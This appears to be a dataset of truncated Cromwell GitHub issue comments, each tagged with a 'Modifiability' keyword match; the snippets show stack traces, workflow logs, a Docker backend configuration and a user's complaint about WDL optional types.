Modifiability,r rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:44); at cromwell.backend.BackendWork,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4610,Config,ConfigInitializationActor,4610,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"r, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses WDL heavily, mostly in the context of Terra/Cromwell, and wants wider adoption. From my experience, oddities like this are serious obstacles for both newcome",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1908,variab,variable,1908,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354,1,['variab'],['variable']
Modifiability,"r-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,32] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,62] [warn] Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, numSubmitAttempts; [2018-11-21 15:09:03,91] [info] Slf4jLogger started; [2018-11-21 15:09:04,16] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-23ba05a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-11-21 15:09:04,43] [info] Metadata summary refreshing every 2 seconds.; [2018-11-21 15:09:04,51] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,53] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,60] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-11-21 15:09:05,40] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Version 35; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] WorkflowManagerActor Successfully started WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor conf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:1294,config,configured,1294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['config'],['configured']
Modifiability,"r.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; ```. I tried adding the [reference services block](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L480), but then I r",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1407,config,config,1407,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"r.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3448,config,config,3448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['config'],['config']
Modifiability,"r.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:2516,config,config,2516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,2,['config'],['config']
Modifiability,r; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.Actor,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:2206,Config,ConfigAsyncJobExecutionActor,2206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,rThread.java:107); 11:09:46 cromwell-test_1 | Caused by: liquibase.exception.LockException: java.lang.NullPointerException; 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.acquireLock(StandardLockService.java:242); 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.waitForLock(StandardLockService.java:170); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:196); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:192); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:58); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:31); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:96); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.lang.Thread.run(Thread.java:748); 11:09:46 cromwell-test_1 | Caused by: java.lang.NullPointerException: null; 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGenera,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:4339,adapt,adapted,4339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['adapt'],['adapted']
Modifiability,rawls production does use rewriteBatchedStatements=true (see https://github.com/broadinstitute/firecloud-develop/blob/prod/configs/rawls/rawls.conf.ctmpl). You need to use it in conjunction with ```tableQuery ++= collection``` instead of ```tableQuery += item```. How are you measuring the effect? I have noticed that jProfiler will still count the inserts individually. I think the slick logs show the right thing. But this is some magic that happens inside the JDBC layer so it is hard to tell what is actually happening. I would suggest running with a local mysql with the general query log on http://dev.mysql.com/doc/refman/5.7/en/query-log.html.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269846704:26,rewrite,rewriteBatchedStatements,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1582#issuecomment-269846704,2,"['config', 'rewrite']","['configs', 'rewriteBatchedStatements']"
Modifiability,"re, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1798,config,config,1798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['config'],['config']
Modifiability,"re_metadata.xml::causedByLists::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809:1963,adapt,adapted,1963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809,1,['adapt'],['adapted']
Modifiability,"really clear comments in the config file, nice",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231378728:29,config,config,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231378728,1,['config'],['config']
Modifiability,"ring cwd; String out; String err; String script; String job_shell. String docker_cwd; String docker_cid; String docker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowIniti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3856,Config,ConfigWdlNamespace,3856,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigWdlNamespace']
Modifiability,"romwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2018-06-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 submitted; 2018-06-07 12:16:52,348 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - 1 new workflows fetched; 2018-06-07 12:16:52,349 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Starting workflow UUID(dd0b1399-ebb6-4d9b-89ea-7da193994220); 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Successfully started WorkflowActor-dd0b1399-ebb6-4d9b-89ea-7da193994220; 2018-06-07 12:16:52,353 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:97171,config,configured,97171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
Modifiability,"rovided.; 2020/07/28 21:30:48 Retrying with user project; Copying file:///google/logs/output [Content-Type=text/plain; charset=UTF-8]...; ```; At least that's fully clarified. However I still get the error:; ```; 2020/07/28 21:30:43 Localizing input gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram -> /cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram; Error attempting to localize file with command: 'mkdir -p '/cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/' && rm -f /root/.config/gcloud/gce && gsutil -o 'GSUtil:parallel_thread_count=1' -o 'GSUtil:sliced_object_download_max_components=1' cp 'gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram' 